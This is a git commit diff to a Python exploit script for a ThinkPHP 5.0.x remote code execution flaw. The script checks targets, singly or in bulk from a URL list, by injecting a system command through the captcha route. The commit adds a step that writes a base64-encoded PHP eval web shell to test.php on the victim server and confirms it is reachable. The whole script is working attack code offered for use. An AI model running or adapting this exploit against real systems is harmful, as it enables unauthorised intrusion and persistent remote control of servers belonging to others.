b522b5b05407153ed81c81e65c45123db8ec02ec
XbnWa <100582941+XbnWa@users.noreply.github.com>
2023-08-22 13:22:37 +0800

    Update Thinkphp5.0.x.py
    添加上传shll

--- Thinkphp5.0.x.py
+++ Thinkphp5.0.x.py
@@ -1,11 +1,6 @@
 import requests
 import argparse 
-import re
 import urllib3
-import subprocess
-
-
-
 
 
 # 禁用警告
@@ -20,32 +15,51 @@ headers = {
 #argparse库的使用
 
 zhushi = argparse.ArgumentParser(description="操作说明",formatter_class=argparse.RawTextHelpFormatter,epilog='''
-python .\Thinkphp5.x.py -u http://xxxxx/ -e pwd  (将需要执行命令的命令放在-e后面)
 python .\Thinkphp5.x.py -u https://xxxxx/  (url中需要加上http://或https://)
+python .\Thinkphp5.x.py -u http://xxxxx/ -e base64编码  (需要上传的代码进行base64编码)
 python .\Thinkphp5.x.py -f url.txt (-f后面是txt文本路径)''')
 
 zhushi.add_argument('-u','--url',type=str,help="url地址")
-zhushi.add_argument('-e','--exp',type=str,default= "echo+success123;",help="执行的命令")
+zhushi.add_argument('-e','--exp',type=str,help="上传shell")
 zhushi.add_argument('-f','--file',type=str,help="文件绝对路径")
+
 
 jiexi = zhushi.parse_args()
 
-rce = jiexi.exp
-print("执行命令    "+rce)
-shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=" + rce  
+uuu = str(jiexi.url) + "/index.php?s=captcha"
 
-if jiexi.url:
-        uuu = jiexi.url + "/index.php?s=captcha"
+
+if jiexi.url and not jiexi.exp:
+    try:
+        print("执行命令    echo+success123;")
+        shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo+success123;"
         post = requests.post(url=uuu,verify=False,headers=headers,data=shuju,timeout=3)
         xiangying = str(post.text)
         #验证是否存在success123回显
-        if  'success123' in xiangying:     
-            print(jiexi.url + ' 存在漏洞')
+        if  'success123' in xiangying: 
+                print(jiexi.url + ' 存在漏洞')
         else:
-            print(jiexi.url + '  漏洞不存在')
-            
+                print(jiexi.url + '  漏洞不存在')
+    except:
+        print(jiexi.url+ '  无法访问')
+
+
+if jiexi.exp:
+        #上传base64编码后的代码默认为<?php @eval($_POST['asd']);?>test
+        shell = str("echo -n PD9waHAgQGV2YWwoJF9QT1NUWydhc2QnXSk7Pz50ZXN0 | base64 -d > test.php")
+        shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]="+shell
+        url = str(jiexi.exp) + "/index.php?s=captcha"
+        post = requests.post(url=url,verify=False,headers=headers,data=shuju,timeout=3)
+        test = str(jiexi.exp+"test.php")
+        get = requests.get(url=test,verify=False,timeout=3)
+        if get.status_code == 200:
+            print('上传shell文件    成功\n'+'shell位置 '+test)
+        else:
+             print("上传shell文件    失败")
+
 
 if jiexi.file:
+    print("执行命令    echo+success123;")
     file = jiexi.file
     file_1 = open(file)
     wj = file_1.readlines()
@@ -53,6 +67,7 @@ if jiexi.file:
         try:
             aa = (wj[i]).strip()
             aa = aa + "/index.php?s=captcha"
+            shuju = r"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo+success123;"
             post = requests.post(url=aa,verify=False,headers=headers,data=shuju,timeout=3)
             xiangying = str(post.text)
             #验证是否存在success123回显
